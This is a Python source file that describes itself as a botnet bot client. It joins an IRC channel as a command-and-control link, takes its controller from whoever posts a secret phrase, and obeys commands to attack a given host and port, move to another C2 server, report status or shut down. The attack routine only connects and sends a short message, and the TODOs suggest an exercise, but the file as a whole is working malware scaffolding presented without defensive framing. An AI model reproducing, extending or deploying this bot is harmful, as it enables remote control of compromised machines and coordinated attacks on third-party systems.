"""
a bot client for a botnet.
"""

import argparse
import sys
import string
import socket
import time


class botClient:
    def __init__(self, host, port, channel, secret_phrase):
        self.host = host
        self.port = port
        self.channel = "#" + channel
        self.secret_phrase = secret_phrase
        #TODO figure out a way to assign unique usernames to bots
        self.bot_nick = "robotnik"
        self.irc_socket = None
        self.controller = None
        self.controller_nick = None
        self.attack_counter = 0

    def start_client(self):
        connected = self.__attempt_connection()

        while connected:
            text = self.get_text()
            self.log(text)

            # validate message (check if controller command)
            if not self.check_msg(text):
                continue
            input_list = text.split(' :')
            command = input_list[1].strip()

            # execute the command
            self.receive_command(command)

        self.irc_socket.close()
    
    def __attempt_connection(self):
        connected = False
        timeout = 5 # timeout (in seconds)
        timeout_start = time.time()
        while not connected and (time.time() < timeout_start + timeout):
            connected = self.__connect()
        if not connected:
            self.log("Error: Connection to Host: " + self.host + \
                     " on Port: " + str(self.port) + " timed out.")
        return connected

    def __connect(self):
        self.irc_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            self.irc_socket.connect((self.host, self.port))  # connect to server
        except Exception:
            return False

        self.send_msg("USER "+ "test" +" "+ self.bot_nick +" "+ self.bot_nick + \
        " :\n") # user authentication
        self.send_msg("NICK "+ self.bot_nick+"\n") # sets nick
        self.send_msg("JOIN "+ self.channel +"\n") # join the channel
        return True

    # Function to check for the secret passphrase
    def check_msg(self, text):
        # TODO add check for NICK --> for if controller changes nickname
        if (not "PRIVMSG" in text) or (not self.channel in text):
            return False

        # get the sender's ID
        sender = text.split(':')[1].split(' ')[0]
        input_list = text.split(' :')
        # get the message sent by the sender
        message = input_list[1].strip()

        # if no controller is defined
        if self.controller is None:
            # if the message is the secret phrase, assign the controller
            if self.secret_phrase == message:
                self.controller = sender
                self.controller_nick, _ = sender.split('!')
                self.log("Controller Identified: " + self.controller)
                return True
            else:
                return False
        # if the message is from the current controller
        elif self.controller == sender:
            return True
        # if the message is not from the current controller
        else:
            return False

    # Code adapted from: https://pythonspot.com/en/building-an-irc-bot/
    def get_text(self):
        text = self.recv_msg() #receive the text
        if text.find('PING') != -1:
            self.send_msg('PONG ' + text.split()[1] + 'rn')
        return text

    # function to receive and execute the command sent by the controller
    def receive_command(self, command):
        # TODO add function call for each command
        if command.startswith("attack"):
            command = command.split()
            if len(command) != 3:
                return
            self.__attack(command[1], command[2])
        elif command.startswith("move"):
            command = command.split()
            if len(command) != 4:
                return
            self.__move(command[1], command[2], command[3])

        elif command == "status":
            self.send_status()
        elif command == "shutdown":
            self.__shutdown()

    # moves the bot to the specified host
    def __move(self, host, port, channel):
        if not check_port(port):
            return
        port = int(port)
        # reconnect to new channel
        self.port = port
        self.host = host
        self.channel = "#" + channel
        self.irc_socket.close()
        # attempt connection - shutdown upon failure
        connected = self.__attempt_connection()
        if not connected:
            self.send_to_user(self.controller_nick, "Move failed")
            #TODO maybe reconnect to original server here
            self.__shutdown()
        return

    # attempts to send the attack message to the target
    def __attack(self, host, port):
        self.attack_counter += 1
        if not check_port(port):
            return
        port = int(port)
        attack_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        connected = False
        timeout = 5 # timeout (in seconds)
        timeout_start = time.time()
        while not connected and (time.time() < timeout_start + timeout):
            try:
                attack_socket.connect((host, port)) # connect to victim
            except Exception:
                continue
            connected = True

        if not connected:
            self.log("Error: Attack on Host: " + host + \
                     " on Port: " + str(port) + " timed out.")
            self.send_to_user(self.controller_nick,
                              "Attack Failed: Connection Error")
        else:
            # send attack message and report success
            attack_socket.send((str(self.attack_counter) + \
                               " " + self.bot_nick).encode())
            self.send_to_user(self.controller_nick, "Attack Successful")

    # sends the bot status to the controller
    def send_status(self):
        self.send_to_user(self.controller_nick, self.bot_nick)
        self.log("Status sent to Controller")

    # Closes connecting and terminates bot
    def __shutdown(self):
        self.log("Shutting Down...")
        self.irc_socket.close()
        sys.exit()

    # function for logging messages
    def log(self, message):
        print(message.strip("\n") + "\n")

    # functions to send/recv raw messages from IRC server
    def send_msg(self, message):
        self.irc_socket.send(message.encode())

    def recv_msg(self):
        return self.irc_socket.recv(2040).decode()  #receive the text

    # functions to send/recv messages to channel
    def send_to_channel(self, message):
        self.send_msg("PRIVMSG " + self.channel + " :" + message + "\n")

    def send_to_user(self, nick, message):
        self.send_msg("PRIVMSG " + nick + " :" + message + "\n")

# function to check if port is valid
def check_port(port):
    try:
        port = int(port)
    except ValueError:
        return False
    if port >= 0 and port <= 65535:
        return True
    else:
        return False

# argparse function to handle user input
# Reference: https://docs.python.org/3.6/howto/argparse.html
# define a string to hold the usage error msg
def parse_arguments():
    usage_string = ("bot.py <host> <port> <channel> <secret-phrase>")
    parser = argparse.ArgumentParser(usage=usage_string)

    parser.add_argument("host",
                        help="Specifies the address of the server",
                        type=str)
    parser.add_argument("port",
                        help="Specifies the port on which the server is listening."
                        " Port in integer range 0-65535",
                        type=int)
    parser.add_argument("channel",
                        help="IRC channel to join",
                        type=str)
    parser.add_argument("secret_phrase",
                        help="A secret text required to connect",
                        type=str)
    args = parser.parse_args()

    # check that port is in a valid range
    if not check_port(args.port):
        parser.exit("usage: " + usage_string)

    return args


def main():
    args = parse_arguments()
    # launch the client
    bot_client = botClient(args.host, args.port, args.channel,
                           args.secret_phrase)
    bot_client.start_client()

if __name__ == '__main__':
    main()
